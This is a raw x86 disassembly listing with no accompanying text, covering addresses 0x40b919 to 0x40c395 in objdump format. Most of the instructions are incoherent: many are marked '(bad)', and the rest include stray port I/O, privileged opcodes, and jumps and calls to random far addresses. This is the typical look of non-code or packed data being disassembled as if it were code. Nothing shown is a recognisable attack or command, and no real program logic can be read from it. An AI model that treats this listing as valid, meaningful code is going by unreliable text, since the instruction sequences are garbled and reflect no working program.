  40b919:	in     eax,0xe7
  40b91b:	xchg   ecx,eax
  40b91c:	push   cs
  40b91d:	out    0xfe,al
  40b91f:	inc    esi
  40b920:	div    dh
  40b922:	idiv   BYTE PTR [esi]
  40b924:	cld    
  40b925:	repnz lods al,BYTE PTR ds:[esi]
  40b927:	test   ah,bh
  40b929:	in     eax,0xfe
  40b92b:	je     0x40b942
  40b92d:	out    dx,al
  40b92e:	(bad)  
  40b92f:	es and eax,0xfc1eacb9
  40b935:	in     eax,0xb4
  40b937:	sbb    DWORD PTR [esi+eiz*8],eax
  40b93a:	inc    BYTE PTR [ecx]
  40b93c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b93d:	mov    eax,0xa07c06fe
  40b942:	clc    
  40b943:	adc    bh,ch
  40b945:	out    0xfe,eax
  40b947:	idiv   BYTE PTR [edi+0x70]
  40b94a:	cld    
  40b94b:	add    DWORD PTR [eax],eax
	...
  40b975:	add    BYTE PTR [eax-0x7b17003c],ch
  40b97b:	sbb    DWORD PTR [eax],ecx
  40b97d:	jmp    0x6b2c8a6a
  40b982:	jbe    0x40b96b
  40b984:	imul   ebp,ecx,0x3cff48d3
  40b98a:	dec    edx
  40b98b:	repz test al,0x93
  40b98e:	jg     0x40b976
  40b990:	mov    BYTE PTR [esi+edi*2],ch
  40b993:	jae    0x40b919
  40b995:	adc    ch,bh
  40b997:	in     eax,0xfd
  40b999:	sbb    al,0x4a
  40b99b:	repz adc eax,0xfee67f9f
  40b9a1:	sbb    al,0x7e
  40b9a3:	out    0x74,al
  40b9a5:	loope  0x40b9bc
  40b9a7:	rsm    
  40b9a9:	add    al,al
  40b9ab:	fwait
  40b9ac:	leave  
  40b9ad:	ret    0x599b
  40b9b0:	push   ebp
  40b9b1:	mov    eax,ebx
  40b9b3:	ffreep st(3)
  40b9b5:	cld    
  40b9b6:	cmp    eax,0x20146a5f
  40b9bb:	scas   al,BYTE PTR es:[edi]
  40b9bc:	push   es
  40b9bd:	call   0x403161
  40b9c2:	push   ds
  40b9c3:	push   ds
  40b9c4:	sti    
  40b9c5:	push   0xbeef5997
  40b9ca:	(bad)  
  40b9cb:	imul   ebx,DWORD PTR [ecx+0x41],0x67
  40b9cf:	mov    cl,0xa2
  40b9d1:	pop    ecx
  40b9d2:	xchg   esi,eax
  40b9d3:	pop    ecx
  40b9d4:	push   DWORD PTR [ebp+0x5f]
  40b9d7:	xor    DWORD PTR [ebx-0x2a],esp
	...
  40ba02:	add    BYTE PTR [eax],al
  40ba04:	and    BYTE PTR [edi+edi*8+0x759c3375],bl
  40ba0b:	or     BYTE PTR [edi],bh
  40ba0d:	ret    0xffa9
  40ba10:	xor    BYTE PTR [edx+0xe2704c2],dl
  40ba16:	mov    ch,ah
  40ba18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba19:	xchg   ebx,eax
  40ba1a:	fdiv   st,st(7)
  40ba1c:	xor    BYTE PTR [ebp+ecx*4-0x1f6ecbb],bl
  40ba23:	jne    0x40ba38
  40ba25:	pushf  
  40ba26:	xor    eax,0xff184faa
  40ba2b:	out    0x41,eax
  40ba2d:	sar    bh,0xff
  40ba30:	sbb    al,0x99
  40ba32:	jne    0x4113ea
  40ba38:	cwde   
  40ba39:	sbb    eax,0x58d700f7
  40ba3e:	add    bh,al
  40ba40:	sbb    ah,BYTE PTR [ebx]
  40ba42:	inc    DWORD PTR [edi]
  40ba44:	out    0x58,eax
  40ba46:	push   0x0
  40ba48:	sub    eax,0x3e006a5f
  40ba4d:	pop    eax
  40ba4e:	add    al,0x8d
  40ba50:	jnp    0x40ba20
  40ba52:	ror    BYTE PTR [ebx+eax*8-0x4e00c79a],cl
  40ba59:	inc    edx
  40ba5a:	inc    ecx
  40ba5b:	jne    0x40ba03
  40ba5d:	ins    DWORD PTR es:[edi],dx
  40ba5e:	mov    dh,0xfb
  40ba60:	xchg   esi,eax
  40ba61:	repnz cdq 
  40ba63:	add    BYTE PTR [esi],bh
  40ba65:	jmp    0x412eac
	...
  40ba92:	cmp    ecx,DWORD PTR [ebx-0xdc1fe6d]
  40ba98:	stos   BYTE PTR es:[edi],al
  40ba99:	test   esi,esi
  40ba9b:	mov    dl,0x2
  40ba9d:	push   ebx
  40ba9f:	in     eax,dx
  40baa0:	sub    dl,BYTE PTR [ecx-0x52]
  40baa3:	and    eax,0x42b55040
  40baa8:	mov    es,WORD PTR [ebp-0xbfd296]
  40baae:	out    dx,al
  40baaf:	lahf   
  40bab0:	sub    al,BYTE PTR [ecx-0x72]
  40bab3:	inc    ebp
  40bab4:	inc    eax
  40bab5:	mov    ebx,eax
  40bab7:	inc    edx
  40bab8:	cmp    bh,bh
  40baba:	inc    ecx
  40babb:	pop    edx
  40babc:	cwde   
  40babd:	lods   al,BYTE PTR ds:[esi]
  40babe:	cmp    DWORD PTR [ebp-0x72],ebx
  40bac1:	test   DWORD PTR [esi],edx
  40bac3:	in     eax,dx
  40bac4:	dec    DWORD PTR ds:[esi+0x7f594eda]
  40bacb:	repnz aas 
  40bacd:	mov    ch,0xe
  40bacf:	add    eax,0x4f11ff3f
  40bad4:	push   0x48
  40bad6:	jg     0x40baca
  40bad8:	sub    dl,BYTE PTR [edx-0x76c0eb2f]
  40bade:	ret    
  40badf:	adc    eax,0x87f1ff37
  40bae4:	add    al,0x68
  40bae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bae7:	dec    edx
  40bae8:	(bad)  
  40baeb:	outs   dx,BYTE PTR ds:[esi]
  40baec:	xor    al,0xf7
  40baee:	fstp   DWORD PTR [edx-0x5a]
  40baf1:	aas    
  40baf2:	or     esi,DWORD PTR [ecx+0xc530]
	...
  40bb20:	leave  
  40bb21:	sti    
  40bb22:	sbb    al,0x6f
  40bb24:	shl    ebx,0x5f
  40bb27:	mov    DWORD PTR [edx+0x243f85eb],ebp
  40bb2d:	pop    ebx
  40bb2e:	adc    DWORD PTR [ebx+0x7],eax
  40bb31:	call   0x3f75:0xeaeb3ee9
  40bb38:	cdq    
  40bb39:	jecxz  0x40bb56
  40bb3b:	push   0x6
  40bb3d:	call   0x3f55:0xb3f02be9
  40bb44:	mov    bh,0xdd
  40bb46:	inc    eax
  40bb47:	aaa    
  40bb48:	jns    0x40bb2d
  40bb4a:	jae    0x40bad5
  40bb4c:	xchg   edx,eax
  40bb4d:	jmp    0x40bb8c
  40bb4f:	aas    
  40bb50:	push   cs
  40bb51:	jae    0x40bb6f
  40bb53:	(bad)  
  40bb55:	pop    edx
  40bb56:	cs jns 0x40bba7
  40bb59:	jmp    0x40bb80
  40bb5b:	aas    
  40bb5c:	push   ecx
  40bb5d:	sub    eax,0x5afecc53
  40bb62:	add    ebx,esi
  40bb64:	nop
  40bb65:	jecxz  0x40bb74
  40bb67:	or     edi,esi
  40bb69:	addr16 loopne 0x40baee
  40bb6c:	repz push ebp
  40bb6f:	sub    DWORD PTR ds:[eax+0x7c],ebx
  40bb73:	adc    esp,DWORD PTR [ecx]
  40bb75:	sub    al,0x5e
  40bb77:	mov    DWORD PTR [esi],ebx
  40bb79:	jmp    0x40bb60
  40bb7b:	outs   dx,BYTE PTR ds:[esi]
  40bb7d:	repz call 0xc223c4f2
  40bb83:	pop    ss
	...
  40bbac:	add    BYTE PTR [eax],al
  40bbae:	xor    eax,0x8e06551b
  40bbb3:	repz mov esp,0xa5e2f16a
  40bbb9:	mov    dh,bl
  40bbbb:	jmp    0xe900:0x4820b5ff
  40bbc2:	cmp    eax,0x88dbcde
  40bbc7:	loop   0x40bbc7
  40bbc9:	jmp    0x54c41c5f
  40bbce:	adc    edx,ebp
  40bbd0:	dec    BYTE PTR [esi+0x6a75673d]
  40bbd6:	mov    esi,0x687ef6f3
  40bbdb:	pop    ebx
  40bbdc:	je     0x40bbe3
  40bbde:	aam    0xe2
  40bbe0:	mov    esp,DWORD PTR [ebp+esi*8-0x17]
  40bbe4:	(bad)  
  40bbe5:	ins    WORD PTR es:[edi],dx
  40bbe7:	loope  0x40bb9d
  40bbe9:	inc    ebp
  40bbea:	push   eax
  40bbeb:	loop   0x40bbeb
  40bbed:	inc    ecx
  40bbee:	test   DWORD PTR [edi],eax
  40bbf0:	dec    DWORD PTR [esi+0x44]
  40bbf3:	sbb    esi,DWORD PTR [ebp+ebx*4-0x44]
  40bbf7:	mov    al,ds:0xe22836d7
  40bbfc:	(bad)  
  40bbfd:	mov    esp,0xe9007a74
  40bc02:	sub    BYTE PTR [ecx-0xcba6302],ah
  40bc08:	push   ecx
  40bc09:	push   ecx
  40bc0a:	or     dl,ah
  40bc0c:	(bad)  
  40bc0d:	pop    esp
  40bc0e:	adc    edx,ebp
  40bc10:	dec    BYTE PTR [esi]
	...
  40bc3a:	add    BYTE PTR [eax],al
  40bc3c:	js     0x40bca6
  40bc3e:	or     BYTE PTR [ecx],dl
  40bc40:	fwait
  40bc41:	mov    bl,0xfe
  40bc43:	(bad)  
  40bc44:	imul   ebp,DWORD PTR [eax-0x1d9c0119],0xfffffffe
  40bc4b:	je     0x40bc92
  40bc4d:	repz xchg edi,eax
  40bc4f:	xchg   ecx,eax
  40bc50:	push   ebx
  40bc51:	loop   0x40bc51
  40bc53:	xchg   esp,eax
  40bc54:	push   0xffffffea
  40bc56:	(bad)  
  40bc57:	(bad)  
  40bc58:	inc    ebx
  40bc59:	test   al,0xe3
  40bc5b:	(bad)  
  40bc5c:	cmp    esp,edx
  40bc5e:	inc    BYTE PTR [eax]
  40bc60:	xor    cl,BYTE PTR [edi-0x18]
  40bc63:	pop    eax
  40bc64:	iret   
  40bc65:	pop    ds
  40bc66:	(bad)  
  40bc67:	jmp    DWORD PTR [edx+0x37]
  40bc6a:	idiv   edi
  40bc6c:	test   al,0x1f
  40bc6e:	jne    0x40bc78
  40bc70:	scas   eax,DWORD PTR es:[edi]
  40bc71:	inc    edx
  40bc72:	test   al,0xff
  40bc74:	test   al,0x1f
  40bc76:	mov    ch,0xe4
  40bc78:	mov    al,ds:0x6fe8ff1f
  40bc7d:	je     0x40bc7e
  40bc7f:	(bad)  
  40bc80:	mov    eax,0x28f7ec69
  40bc85:	and    al,ch
  40bc87:	dec    ebp
  40bc88:	cld    
  40bc89:	pop    ds
  40bc8a:	(bad)  
  40bc8b:	call   DWORD PTR [edx+0x2f]
  40bc8e:	idiv   edi
  40bc90:	sbb    BYTE PTR [edi],ch
  40bc92:	inc    edx
  40bc93:	stos   DWORD PTR es:[edi],eax
  40bc94:	call   0xe7f6bbb8
  40bc99:	daa    
  40bc9a:	(bad)  
  40bc9b:	(bad)  
  40bc9c:	jmp    edi
  40bc9e:	test   eax,0xff
	...
  40bcc7:	add    BYTE PTR [eax],al
  40bcc9:	add    al,bh
  40bccb:	pop    ds
  40bccc:	inc    ebp
  40bccd:	clc    
  40bcce:	push   cs
  40bccf:	sbb    eax,0x2028fffd
  40bcd4:	jne    0x40bcd2
  40bcd6:	dec    DWORD PTR [ebx]
  40bcd8:	xchg   esi,eax
  40bcd9:	add    BYTE PTR [edi-0x6c],ah
  40bcdc:	ret    0x5708
  40bcdf:	or     BYTE PTR [edx-0xb6d2b14],cl
  40bce5:	call   edx
  40bce7:	push   eax
  40bce8:	call   0x984fd8
  40bced:	mov    edx,esp
  40bcef:	and    al,0xff
  40bcf1:	jne    0x40bd22
  40bcf3:	xor    eax,0x2028ab21
  40bcf8:	mov    DWORD PTR [ebp+0x1b],eax
  40bcfb:	and    BYTE PTR [ebp-0x4],dh
  40bcfe:	call   0x3f40b3ac
  40bd03:	jg     0x40bd15
  40bd05:	call   0xff7c8641
  40bd0a:	inc    ebp
  40bd0b:	mov    dl,0xb6
  40bd0d:	cmp    eax,0x6a3837b7
  40bd12:	ds ja  0x40bcdb
  40bd15:	rep outs dx,BYTE PTR ds:[esi]
  40bd17:	mov    cl,0xb5
  40bd19:	sti    
  40bd1a:	out    0x53,al
  40bd1c:	pop    eax
  40bd1d:	dec    ecx
  40bd1f:	in     eax,dx
  40bd20:	inc    edx
  40bd21:	je     0x40bd3a
  40bd23:	pop    edx
  40bd24:	add    al,0x10
  40bd26:	test   eax,0x46753c90
  40bd2b:	retf   0xa786
	...
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	test   eax,0xa6753c61
  40bd5d:	imul   esi,DWORD PTR [esi+0xae7990b],0x3bd1e2e8
  40bd67:	dec    DWORD PTR [ecx+0xbff3707]
  40bd6d:	xchg   BYTE PTR [esi*2-0x586265ba],bh
  40bd74:	jno    0x40bd0f
  40bd76:	cmp    al,0x75
  40bd78:	push   0xffffff8a
  40bd7a:	ins    BYTE PTR es:[edi],dx
  40bd7b:	stos   BYTE PTR es:[edi],al
  40bd7c:	popa   
  40bd7d:	sub    DWORD PTR [edx-0x3e],ecx
  40bd80:	inc    esi
  40bd81:	repnz aad 0x8a
  40bd84:	bound  esi,QWORD PTR [ebp+0x47]
  40bd87:	call   0xbf6fe7c
  40bd8c:	push   esi
  40bd8d:	retf   
  40bd8e:	imul   edi,edi,0x39
  40bd91:	std    
  40bd92:	inc    edx
  40bd93:	jne    0x40bdd0
  40bd95:	mov    eax,0xf236c249
  40bd9a:	lea    eax,[ebp+0x2e]
  40bd9d:	ret    0x753b
  40bda0:	dec    edx
  40bda1:	pop    edx
  40bda2:	call   0xe69bcf56
  40bda7:	paddd  mm1,QWORD PTR [edi+0x65]
  40bdab:	sahf   
  40bdac:	ds pop ebx
  40bdae:	jmp    0xc12030ed
  40bdb3:	mov    ah,BYTE PTR [edi+ebx*8-0x107c723b]
  40bdba:	mov    ebp,0xb1
	...
  40bde3:	add    BYTE PTR [eax],al
  40bde5:	add    ch,ah
  40bde7:	fistp  QWORD PTR [ebx]
  40bde9:	sub    cl,bl
  40bdeb:	gs mov cl,0x2c
  40bdee:	mov    dh,BYTE PTR [ebp+eiz*4-0x729a4ac5]
  40bdf5:	das    
  40bdf6:	ja     0x40be6b
  40bdf8:	out    0xdd,eax
  40bdfa:	(bad)  
  40bdfb:	pop    edx
  40bdfc:	aaa    
  40bdfd:	sub    al,0x92
  40bdff:	enter  0x3e8,0x35
  40be03:	sbb    esi,esp
  40be05:	add    eax,0x34621d95
  40be0a:	es push ecx
  40be0c:	adc    eax,ebp
  40be0e:	xchg   ecx,eax
  40be0f:	test   DWORD PTR [edx],0xea5b3e91
  40be15:	xor    esi,DWORD PTR [edi+0x5aac4165]
  40be1b:	test   DWORD PTR [eax-0x7d0cf7fd],ebp
  40be21:	xchg   edx,eax
  40be22:	ds pop ebx
  40be24:	repnz inc ebx
  40be26:	jmp    0x40be84
  40be28:	inc    edx
  40be29:	pop    ds
  40be2a:	les    ecx,FWORD PTR [edx+0x27]
  40be2d:	add    al,0x3e
  40be2f:	mov    edi,DWORD PTR [ebx+0x1df2d33a]
  40be35:	mov    cl,0x39
  40be37:	repz (bad) 
  40be3b:	fbstp  TBYTE PTR [edx+0x694bb9db]
  40be41:	cli    
  40be42:	sub    DWORD PTR [eax+0x3b],ebp
  40be45:	lods   al,BYTE PTR ds:[esi]
  40be46:	ds dec ebx
  40be48:	add    BYTE PTR [esi],al
	...
  40be72:	add    BYTE PTR [eax],al
  40be74:	xchg   esp,eax
  40be75:	fidiv  WORD PTR [ecx+eiz*8+0x65]
  40be79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7b:	out    0x44,al
  40be7d:	fidiv  WORD PTR [ebp+ebx*8+0x44]
  40be81:	push   0x56aed6ec
  40be86:	call   0xff1f1e39
  40be8b:	(bad)  
  40be8c:	scas   al,BYTE PTR es:[edi]
  40be8d:	repnz out 0xb9,eax
  40be90:	push   edx
  40be91:	fdivp  st(6),st
  40be93:	fs (bad) 
  40be95:	out    dx,al
  40be96:	dec    edi
  40be97:	shl    DWORD PTR [ebx+ebp*4],0xfe
  40be9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be9c:	sbb    BYTE PTR [ebx+0x5e],bl
  40be9f:	mov    al,0x7b
  40bea1:	push   ebx
  40bea2:	add    BYTE PTR [ecx+ecx*8],bh
  40bea5:	out    dx,eax
  40bea6:	and    BYTE PTR [ebp+0x13007169],0x4f
  40bead:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40beb1:	push   ebp
  40beb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb3:	jbe    0x40bf09
  40beb5:	aam    0x44
  40beb7:	ins    DWORD PTR es:[edi],dx
  40beb8:	in     eax,0x4
  40beba:	pop    ecx
  40bebb:	test   al,0x3d
  40bebd:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40bec1:	mov    dh,0xfb
  40bec3:	push   esi
  40bec4:	xor    al,0x71
  40bec6:	add    cl,al
  40bec8:	popa   
  40bec9:	test   BYTE PTR [ecx-0x17],al
  40becc:	xchg   ebp,eax
  40becd:	ds pop edx
  40becf:	test   al,0x3d
  40bed1:	fidiv  WORD PTR [ebx+eax*4]
  40bed4:	test   DWORD PTR [ebx+0x4100],ebx
	...
  40bf02:	aam    0xae
  40bf04:	(bad)  
  40bf05:	cmp    BYTE PTR es:[ebx],bl
  40bf08:	je     0x40bf0d
  40bf0a:	xchg   edx,eax
  40bf0b:	pop    ecx
  40bf0c:	pop    edx
  40bf0d:	test   al,0x3d
  40bf0f:	mov    ebp,eax
  40bf11:	bound  esp,QWORD PTR [esi-0x38ff0122]
  40bf17:	or     esi,edi
  40bf19:	jne    0x40bf4a
  40bf1b:	xor    ah,bl
  40bf1d:	(bad)  
  40bf1e:	adc    BYTE PTR [eax+ebp*8],ah
  40bf21:	mov    DWORD PTR [esi+0x21],edi
  40bf24:	jmp    FWORD PTR [edx+0x3d]
  40bf27:	das    
  40bf28:	fisubr DWORD PTR [ebp-0x3ff4dc20]
  40bf2e:	fwait
  40bf2f:	(bad)  
  40bf30:	imul   WORD PTR [esi]
  40bf33:	sbb    bh,bh
  40bf35:	dec    edi
  40bf36:	ud1    ebp,DWORD PTR [ebx+0x1aea0ff]
  40bf3d:	pop    edx
  40bf3e:	es push edi
  40bf40:	push   eax
  40bf41:	call   0x403572
  40bf46:	pop    es
  40bf47:	pop    es
  40bf48:	(bad)  
  40bf49:	jne    0x40bf1a
  40bf4b:	xor    DWORD PTR [ebx-0x17dc2f02],esi
  40bf51:	pop    ecx
  40bf52:	(bad)  
  40bf53:	and    edi,edi
  40bf55:	push   0xffffffa3
  40bf57:	xor    DWORD PTR [edx+0xb2420ad],ebp
  40bf5d:	rcr    BYTE PTR [ebx+0x2ef766fc],0x1a
  40bf64:	dec    DWORD PTR [edi+0x0]
	...
  40bf8f:	add    bh,ch
  40bf91:	call   0xaf21bf41
  40bf96:	add    DWORD PTR [edx-0x5a],ebx
  40bf99:	pop    ecx
  40bf9a:	push   eax
  40bf9b:	call   0x4035dc
  40bfa0:	(bad)  
  40bfa1:	or     esi,edi
  40bfa3:	jne    0x40c014
  40bfa5:	xor    DWORD PTR [ebx-0x17dbef02],eax
  40bfab:	sub    DWORD PTR [esi+0x746aff23],edi
  40bfb1:	xor    DWORD PTR [edx-0x53],edi
  40bfb4:	and    BYTE PTR [ebx+ecx*1],ah
  40bfb7:	sar    BYTE PTR [esi],0xbe
  40bfba:	frstor [edi+0x29]
  40bfbd:	lods   al,BYTE PTR ds:[esi]
  40bfbe:	sar    edi,0x79
  40bfc1:	dec    edx
  40bfc2:	add    ch,BYTE PTR [ebp+0x2aade21]
  40bfc8:	je     0x40bf7d
  40bfca:	add    dl,BYTE PTR [eax+0x26]
  40bfcd:	jmp    0xfed4:0x2309ff66
  40bfd4:	mov    ebp,edx
  40bfd6:	sub    dl,BYTE PTR [ebx-0x8]
  40bfd9:	add    eax,0xdaf7e838
  40bfde:	aaa    
  40bfdf:	(bad)  
  40bfe0:	jmp    0x6c3ff804
  40bfe5:	jmp    0xc937:0xa5a06c2a
  40bfec:	cld    
  40bfed:	test   BYTE PTR [edx],0x55
  40bff0:	mov    ch,0xc6
  40bff2:	add    esp,0x0
	...
  40c01c:	add    BYTE PTR [eax],al
  40c01e:	loop   0x40bfe5
  40c020:	aaa    
  40c021:	dec    ebx
  40c023:	das    
  40c024:	cmp    BYTE PTR [eax-0x4f],dl
  40c027:	inc    edi
  40c028:	adc    al,0xff
  40c02a:	xor    esp,esi
  40c02c:	sub    al,BYTE PTR [ebx+ecx*8]
  40c02f:	repnz add cl,BYTE PTR [ebx]
  40c032:	jle    0x40c029
  40c034:	jge    0x40bff4
  40c036:	aas    
  40c037:	repnz add al,bh
  40c03a:	add    edi,DWORD PTR [edx+0x3]
  40c03d:	add    BYTE PTR [esi],bh
  40c03f:	repnz aas 
  40c041:	inc    ebp
  40c042:	jb     0x40bfc9
  40c044:	add    BYTE PTR [eax],al
  40c046:	sbb    BYTE PTR ds:[ebx],al
  40c049:	push   0x3e
  40c04b:	or     BYTE PTR [ebx],al
  40c04d:	push   0x3e
  40c04f:	outs   dx,DWORD PTR ds:[esi]
  40c050:	mov    esi,0x7e76eef3
  40c055:	hlt    
  40c056:	dec    ecx
  40c057:	sub    eax,0x5b495038
  40c05c:	pushf  
  40c05d:	cmp    eax,DWORD PTR [ecx+0x66]
  40c060:	sbb    eax,0xe8c7102b
  40c065:	add    eax,DWORD PTR [ebp+0x1b]
  40c068:	xchg   ebp,eax
  40c069:	(bad)  
  40c06a:	push   ss
  40c06b:	(bad)  
  40c06d:	add    edi,DWORD PTR [esi]
  40c06f:	jae    0x40c0d8
  40c071:	retf   
  40c072:	jle    0x40c0cf
  40c074:	imul   BYTE PTR [ebp+0x67c5f341]
  40c07a:	or     esp,ebx
  40c07c:	cmp    BYTE PTR [ebx+0x3063cdee],cl
	...
  40c0aa:	add    BYTE PTR [eax],al
  40c0ac:	icebp  
  40c0ad:	fcmovnbe st,st(5)
  40c0af:	aam    0x8f
  40c0b1:	repz cmc 
  40c0b3:	addr16 jmp 0xeec23094
  40c0b9:	jecxz  0x40c078
  40c0bb:	aaa    
  40c0bc:	out    0x6d,al
  40c0be:	xor    DWORD PTR [edi],0xabe970d1
  40c0c4:	ins    DWORD PTR es:[edi],dx
  40c0c5:	sub    DWORD PTR [eax],0x98a5c104
  40c0cb:	das    
  40c0cc:	mov    ecx,0x45b195db
  40c0d1:	repz sbb BYTE PTR [ebx-0x57],ch
  40c0d5:	fld    TBYTE PTR [edi-0x7f]
  40c0d8:	call   0x15b:0x24377de3
  40c0df:	fincstp 
  40c0e1:	cdq    
  40c0e2:	jmp    0x5e2b941d
  40c0e7:	aaa    
  40c0e8:	sbb    ebx,0x856607d3
  40c0ee:	xor    BYTE PTR [edi],0x71
  40c0f1:	shl    DWORD PTR [ebx+0x24],1
  40c0f4:	jno    0x40c0d1
  40c0f6:	inc    ebp
  40c0f7:	stos   BYTE PTR es:[edi],al
  40c0f8:	popa   
  40c0f9:	jae    0x40c0a0
  40c0fb:	fsin   
  40c0fd:	pop    edx
  40c0fe:	add    BYTE PTR [esi],dh
  40c100:	iret   
  40c101:	jmp    0xf574:0xdc112ef6
  40c108:	adc    eax,0x711eab21
  40c10d:	in     al,0x84
  40c10f:	add    eax,0x0
	...
  40c138:	add    BYTE PTR [eax],al
  40c13a:	popa   
  40c13b:	(bad)  
  40c13d:	cmp    DWORD PTR ds:0xfaa34b43,0xffffffda
  40c144:	std    
  40c145:	xor    al,0x52
  40c147:	sar    dh,cl
  40c149:	test   BYTE PTR [eax+0x50],0xc
  40c14d:	add    DWORD PTR [ecx],esi
  40c14f:	push   es
  40c150:	jmp    esi
  40c152:	mov    dl,0xe0
  40c154:	out    0xd6,eax
  40c156:	xor    dl,bl
  40c158:	imul   ebp,ecx,0x285a41a5
  40c15e:	inc    edx
  40c15f:	fidiv  DWORD PTR [ecx+edi*4-0x410125f0]
  40c166:	mov    fs,WORD PTR [esi-0x18]
  40c169:	in     eax,dx
  40c16a:	fs (bad) 
  40c16d:	pusha  
  40c16e:	mov    esi,0x8a6f6b7
  40c173:	fidivr WORD PTR [ebp+eax*4-0x16012598]
  40c17a:	out    dx,al
  40c17b:	arpl   WORD PTR [ebx-0x12da2b4],ax
  40c181:	xchg   BYTE PTR ds:0x166a654f,bh
  40c187:	(bad)  
  40c188:	div    BYTE PTR [esi+0x48]
  40c18b:	pop    ebx
  40c18c:	je     0x40c19b
  40c18e:	mov    ebp,0x485ee818
  40c193:	(bad)  
  40c195:	aam    0x8c
  40c197:	inc    edx
  40c198:	add    cl,ch
  40c19a:	sbb    BYTE PTR [ecx],bl
  40c19c:	call   esp
	...
  40c1c6:	add    BYTE PTR [eax],al
  40c1c8:	xor    eax,0xb30065c3
  40c1cd:	xchg   ecx,eax
  40c1ce:	(bad)  
  40c1cf:	call   edx
  40c1d1:	xor    edi,0x759108ff
  40c1d7:	or     bh,bh
  40c1d9:	push   ebx
  40c1da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1db:	call   FWORD PTR [eax]
  40c1dd:	xchg   ecx,eax
  40c1de:	mov    ch,0xe8
  40c1e0:	push   eax
  40c1e1:	xchg   ecx,eax
  40c1e2:	(bad)  
  40c1e3:	call   edx
  40c1e5:	gs call 0xffd24597
  40c1eb:	jmp    DWORD PTR [edx+0x7a]
  40c1ee:	idiv   edi
  40c1f0:	sbb    BYTE PTR [eax-0xfc0f78b],dl
  40c1f6:	mov    ds:0xb59018ff,eax
  40c1fb:	loopne 0x40c1dd
  40c1fd:	(bad)  
  40c1fe:	(bad)  
  40c1ff:	call   DWORD PTR [edx-0x3c6f1799]
  40c205:	(bad)  
  40c206:	(bad)  
  40c207:	call   edx
  40c209:	xor    dh,bh
  40c20b:	(bad)  
  40c20c:	clc    
  40c20d:	(bad)  
  40c20e:	jne    0x40c218
  40c210:	out    dx,eax
  40c211:	fsub   QWORD PTR [ebx-0x4a707701]
  40c217:	in     al,0x90
  40c219:	(bad)  
  40c21a:	(bad)  
  40c21b:	call   0x3ffa53
  40c220:	fmul   DWORD PTR [ecx-0x20]
  40c223:	test   eax,0x59e88f
  40c229:	nop
  40c22a:	(bad)  
  40c22b:	inc    DWORD PTR [eax]
	...
  40c255:	add    BYTE PTR [edx-0x7d],ah
  40c258:	idiv   edi
  40c25a:	sbb    BYTE PTR [edi-0x6ff758b2],al
  40c260:	push   DWORD PTR [ebp-0x7841]
  40c266:	out    dx,eax
  40c267:	fwait
  40c268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c269:	call   FWORD PTR [eax]
  40c26b:	nop
  40c26c:	mov    ch,0xdc
  40c26e:	cmp    DWORD PTR ds:0x5d6b56ff,esi
  40c275:	jmp    DWORD PTR [ecx+0x20]
  40c278:	outs   dx,DWORD PTR ds:[esi]
  40c279:	lock push ecx
  40c27b:	cwde   
  40c27c:	xor    eax,0x33bfcbff
  40c281:	jne    0x40c2b9
  40c283:	sbb    al,0xf7
  40c285:	std    
  40c286:	inc    ecx
  40c287:	xor    BYTE PTR ds:0x35722eb5,0xff
  40c28e:	es iret 
  40c290:	pop    ebx
  40c291:	jmp    FWORD PTR [ecx]
  40c293:	push   0xffffffbf
  40c295:	not    DWORD PTR [edi]
  40c297:	hlt    
  40c298:	xor    al,0xff
  40c29a:	sbb    edx,ebx
  40c29c:	lods   eax,DWORD PTR ds:[esi]
  40c29d:	sti    
  40c29e:	or     edx,DWORD PTR es:[eax+0x427b3e00]
  40c2a5:	or     al,0x3e
  40c2a7:	xchg   edi,eax
  40c2a8:	mov    esp,ebp
  40c2aa:	mov    ebp,0x3e6a36fe
  40c2af:	sbb    al,0xe
  40c2b1:	push   DWORD PTR [ebx-0x46]
  40c2b4:	sub    ch,BYTE PTR [esi]
  40c2b6:	call   0x0:0x8933a1
	...
  40c2e1:	add    BYTE PTR [eax],al
  40c2e3:	add    BYTE PTR [ebx+0x7470ab16],al
  40c2e9:	add    DWORD PTR [eax+ebp*2],0x3c
  40c2ed:	ret    0x8002
  40c2f0:	shl    DWORD PTR [edi+0xc],0xe8
  40c2f4:	mov    cl,0xf7
  40c2f6:	xor    edi,edi
  40c2f8:	es jae 0x40c2d5
  40c2fb:	inc    eax
  40c2fc:	ds jmp 0x83376cef
  40c302:	add    al,0xff
  40c304:	adc    ecx,edx
  40c306:	sub    ah,ah
  40c308:	xchg   ebx,eax
  40c309:	push   ecx
  40c30a:	xor    al,0xff
  40c30c:	adc    eax,DWORD PTR [esi+0x34]
  40c30f:	jne    0x40c347
  40c311:	pop    ebx
  40c312:	push   ecx
  40c313:	ret    0xd89d
  40c316:	pop    ebp
  40c317:	dec    edx
  40c318:	jl     0x40c379
  40c31a:	jmp    0x680877ed
  40c31f:	aas    
  40c320:	adc    al,0x45
  40c323:	xor    al,0xcb
  40c325:	push   ds
  40c326:	cmp    eax,0xd94e50d3
  40c32b:	xor    al,0xd3
  40c32d:	inc    cx
  40c32f:	pop    edx
  40c330:	lods   al,BYTE PTR ds:[esi]
  40c331:	pop    ebx
  40c332:	jmp    0x64a8c13f
  40c337:	jne    0x40c378
  40c339:	pop    ebx
  40c33a:	jmp    0xe914467b
  40c33f:	add    edi,DWORD PTR [esi]
  40c341:	pop    ebx
  40c342:	cs mov esi,0x3e5d80d
	...
  40c370:	add    BYTE PTR [eax],al
  40c372:	ds inc ebp
  40c374:	jmp    0xe982cd22
  40c379:	test   eax,0x382be701
  40c37e:	mov    fs,esi
  40c380:	arpl   WORD PTR [eax],di
  40c382:	jmp    0xe915995e
  40c387:	dec    ebp
  40c388:	shl    DWORD PTR [ebx],1
  40c38a:	imul   edx,edi,0xffffffd0
  40c38d:	pop    edi
  40c38e:	lods   al,BYTE PTR ds:[esi]
  40c38f:	pop    edx
  40c390:	jmp    0xec8f5593
  40c395:	sbb    al,0xbf
